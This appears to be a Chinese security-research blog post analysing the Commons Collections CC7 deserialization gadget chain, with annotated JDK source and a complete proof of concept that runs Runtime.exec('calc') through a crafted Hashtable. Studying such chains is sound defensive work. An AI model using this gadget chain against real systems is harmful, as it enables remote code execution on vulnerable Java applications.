

# 分析版本

Commons Collections 3.2.1

JDK 8u65

环境配置参考[JAVA安全初探(三):CC1链全分析](https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4%2bxCw67o7KKG=z4D&amp;alichlgref=https://www.google.com/)

# 分析过程

CC7,6,5都是在CC1 LazyMap利用链(引用)的基础上。

只是进入到LazyMap链的入口链不同。

CC7这个链有点绕，下面顺着分析一下利用链。

入口类是Hashtable，看下它的readObject函数。

调用了reconstitutionPut方法

```java
private void readObject(java.io.ObjectInputStream s)
     throws IOException, ClassNotFoundException
{
    // Read in the length, threshold, and loadfactor
    s.defaultReadObject();

    // Read the original length of the array and number of elements
    int origlength = s.readInt();
    int elements = s.readInt();

    // Compute new size with a bit of room 5% to grow but
    // no larger than the original size.  Make the length
    // odd if it's large enough, this helps distribute the entries.
    // Guard against the length ending up zero, that's not valid.
    int length = (int)(elements * loadFactor) + (elements / 20) + 3;
    if (length > elements && (length & 1) == 0)
        length--;
    if (origlength > 0 && length > origlength)
        length = origlength;
    table = new Entry<?,?>[length];
    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
    count = 0;

    // Read the number of elements and then all the key/value objects
    for (; elements > 0; elements--) {
        @SuppressWarnings("unchecked")
            K key = (K)s.readObject();
        @SuppressWarnings("unchecked")
            V value = (V)s.readObject();
        // synch could be eliminated for performance
        reconstitutionPut(table, key, value);
    }
}
```

首先要知道，HashTable是数组+链表的形式，链表是用来处理哈希冲突的。

**代码分析放在注释中**

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
    throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    int hash = key.hashCode();
    int index = (hash & 0x7FFFFFFF) % tab.length;      //首先求key的哈希值
    for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) { //for循环是判断，key哈希值对应的链表中有没有key相同的键值对，如果有则抛出异常（键不能相同）
        if ((e.hash == hash) && e.key.equals(key)) {    //根据运算符规则，我们想执行&&的第二项e.key.equals(key)就要保证第一项(e.hash == hash)为真（关于哈希碰撞的寻找，下面讲）
            throw new java.io.StreamCorruptedException();
        }
    }
    // Creates the new entry.
    @SuppressWarnings("unchecked")
        Entry<K,V> e = (Entry<K,V>)tab[index];
    tab[index] = new Entry<>(hash, key, value, e);
    count++;
}
```

调用从e.key.equals(key)开始，我们可以控制两个key的传值。**（下文中e.key用key1代替，(key)用key2代替）**

首先e.key.equals，我们控制key1的类型是LazyMap，就成了调用LazyMap.equals()。而LazyMap类中没有实现equals方法，就调用到了它父类AbstractMapDecorator的equals。

```java
public boolean equals(Object object) { //参数参入的是key2
    if (object == this) {
        return true;
    }
    return map.equals(object);         //这里的map注意是，key1（LazyMap的key）  作者在这里是把LazyMap的key设置为HashMap类型， 具体原因下面分析
}
```

下面走到了HashMap.equals(key2) ，这里又由于HashMap中没有equals方法，成了调用其父类AbstractMap的equals方法。

```java
public boolean equals(Object o) {    //参数传入是key2
    if (o == this)
        return true;

    if (!(o instanceof Map))
        return false;
    Map<?,?> m = (Map<?,?>) o;      //key2赋值给m
    if (m.size() != size())
        return false;

    try {
        Iterator<Entry<K,V>> i = entrySet().iterator();
        while (i.hasNext()) {
            Entry<K,V> e = i.next();
            K key = e.getKey();
            V value = e.getValue();
            if (value == null) {
                if (!(m.get(key)==null && m.containsKey(key))) 
                    return false;
            } else {
                if (!value.equals(m.get(key)))            //m是key2调用key2的get方法，也就是找到了调用LazyMap.get()的地方，我们把key2赋个LazyMap类型就好了，   key是key1
                    return false;
            }
        }
    } catch (ClassCastException unused) {
        return false;
    } catch (NullPointerException unused) {
        return false;
    }

    return true;
}
```

到这里调用到了LazyMap.get方法，利用链完成。

我们传入两个LazyMap，保证两个LazyMap.hashCode相等，也就是LazyMap.key.hashCode的值相等，找哈希碰撞。

下面看下哈希碰撞，作者找到的是String类的碰撞

```java
public int hashCode() { //String类的hashCode方法
    int h = hash;
    if (h == 0 && value.length > 0) {
        char val[] = value;

        for (int i = 0; i < value.length; i++) {
            h = 31 * h + val[i];
        }
        hash = h;
    }
    return h;
}
```

$$
"yy".hashCode()=31*ASCII(y) + 1*ASCII(y) = 31*121+1*121=3872
$$

和"zZ"求出来的值是一样的，哈希碰撞我们就找到了。

我们把"yy"和"zZ"，put进LazyMap的key中就好了。

之后写Poc

```java
public class cc7 {
    //Hashtable
    //Map map = new HashMap<>;
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer("1")
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();

        Map map1 = LazyMap.decorate(hashMap1, chainedTransformer);
        map1.put("yy", 1);                    ////写入hashMap1
        Map map2 = LazyMap.decorate(hashMap2, chainedTransformer);
        map2.put("zZ", 1);

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);
        
        //cc1_poc.serialize(hashtable);
        cc1_poc.unserialize("s.ser");
    }
}
```

我们发现反序列化时不能弹计算器，debug看一下，第二个key传进来的size是2，导致hashCode计算为7730

![image-20240709150021575](https://s2.loli.net/2024/07/09/Jljmw8DsedxHtNU.png)

传进来size是2是因为，在`hashtable.put(map2, 1);`时，触发了利用链（put方法也会检查键值对，触发利用链），调用了LazyMap的get方法（触发了计算器），还执行了map2.put("yy", 1)。解决map2.put问题，在序列化之前我们反射调用map2的remove方法，把"yy"删除。

![image-20240709152052991](https://s2.loli.net/2024/07/09/I45K7NSoVDvbseY.png)

最终Poc

```java
public class cc7 {
    //Hashtable
    //Map map = new HashMap<>;
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer("1")
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();

        Map map1 = LazyMap.decorate(hashMap1, chainedTransformer);
        map1.put("yy", 1);                    ////写入hashMap1
        Map map2 = LazyMap.decorate(hashMap2, chainedTransformer);
        map2.put("zZ", 1);

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);

        //反射
        Method remove = map2.getClass().getDeclaredMethod("remove", Object.class);
        remove.setAccessible(true);
        remove.invoke(map2,"yy");

        cc1_poc.serialize(hashtable);
        cc1_poc.unserialize("s.ser");
    }
}
```

这样在序列化时也会触发计算器